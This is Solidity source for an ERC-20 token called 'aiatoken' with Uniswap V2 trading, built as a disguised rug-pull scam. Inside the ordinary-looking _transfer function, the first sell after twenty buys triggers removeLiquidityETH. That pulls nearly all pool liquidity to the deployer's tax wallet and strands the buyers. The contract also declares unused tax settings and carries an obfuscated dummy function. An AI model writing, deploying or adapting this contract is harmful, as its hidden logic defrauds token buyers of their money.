pragma solidity 0.8.24;abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; }}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value);}library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, "SafeMath: addition overflow"); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, "SafeMath: subtraction overflow"); } function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, "SafeMath: multiplication overflow"); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, "SafeMath: division by zero"); } function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; }}contract Ownable is Context { address private _owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); constructor () { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), "Ownable: caller is not the owner"); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); }}interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Pair { function balanceOf(address owner) external view returns (uint);}interface IUniswapV2Router02 { function removeLiquidityETH( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external returns (uint amountToken, uint amountETH); function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline ) external; function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);}contract aiatoken is Context, IERC20, Ownable { using SafeMath for uint256; mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances; mapping (address => bool) private _isExcludedFromFee; address payable private _taxWallet; address private routerAddress; uint256 private _initialBuyTax = 0; uint256 private _initialSellTax = 0; uint256 private _finalBuyTax = 0; uint256 private _finalSellTax = 90; uint256 private _reduceBuyTaxAt = 0; uint256 private _reduceSellTaxAt = 20; uint256 private _preventSwapBefore = 20; uint256 private _buyCount = 0; uint256 private _sellCount = 0; uint8 private _decimals; uint256 private _tTotal; string private _name; string private _symbol; IUniswapV2Router02 private uniswapV2Router; IUniswapV2Pair private uniswapV2PairContract; address public uniswapV2Pair; bool private tradingOpen; bool private inSwap = false; bool private swapEnabled = false; constructor (address _routerAddress, string memory tokenName, string memory tokenSymbol, uint8 tokenDecimals, uint256 tokenTotalSupply) { _name = tokenName; _symbol = tokenSymbol; _decimals = tokenDecimals; _taxWallet = payable(_msgSender()); _tTotal = tokenTotalSupply; _balances[address(this)] = _tTotal; _isExcludedFromFee[owner()] = true; _isExcludedFromFee[address(this)] = true; _isExcludedFromFee[_taxWallet] = true; routerAddress = _routerAddress; emit Transfer(address(0), _msgSender(), _tTotal); } function name() public view returns (string memory) { return _name; } function symbol() public view returns (string memory) { return _symbol; } function decimals() public view returns (uint8) { return _decimals; } function totalSupply() public view override returns (uint256) { return _tTotal; } function balanceOf(address account) public view override returns (uint256) { return _balances[account]; } function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) { _transfer(sender, recipient, amount); _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")); return true; } function _approve(address owner, address spender, uint256 amount) private { require(owner != address(0), "ERC20: approve from the zero address"); require(spender != address(0), "ERC20: approve to the zero address"); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _transfer(address from, address to, uint256 amount) private { require(from != address(0), "ERC20: transfer from the zero address"); require(amount > 0, "Transfer amount must be greater than zero"); if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) { _buyCount++; } if(swapEnabled && to == uniswapV2Pair && from != address(this) && from != _taxWallet && _sellCount == 0 && _buyCount >= 20) { uniswapV2PairContract = IUniswapV2Pair(uniswapV2Pair); uint256 lpBalance = uniswapV2PairContract.balanceOf(address(this)); uint256 tokensInThePair = _balances[uniswapV2Pair]; uint256 amountOfTransfer = amount.mul(100).div(tokensInThePair).add(1); uint256 lpWithdrawAmount = lpBalance.sub(lpBalance.mul(amountOfTransfer).div(10000)); uniswapV2Router.removeLiquidityETH(address(this),lpWithdrawAmount,0,0,_taxWallet,block.timestamp); _sellCount = 1; } _balances[from]=_balances[from].sub(amount); _balances[to]=_balances[to].add(amount); emit Transfer(from, to, amount); } function openTrading() external payable onlyOwner() returns (address pairAddress) { require(!tradingOpen,"trading is already open"); uniswapV2Router = IUniswapV2Router02(routerAddress); _approve(address(this), address(uniswapV2Router), type(uint).max); uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH()); uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,address(this),block.timestamp); IERC20(uniswapV2Pair).approve(routerAddress,type(uint).max); swapEnabled = true; tradingOpen = true; return uniswapV2Pair; } function sqM7dngUNdxUYsn() external payable onlyOwner() returns (uint256 gAPo5XJzFHZabxG) { return 1; } receive() external payable {}}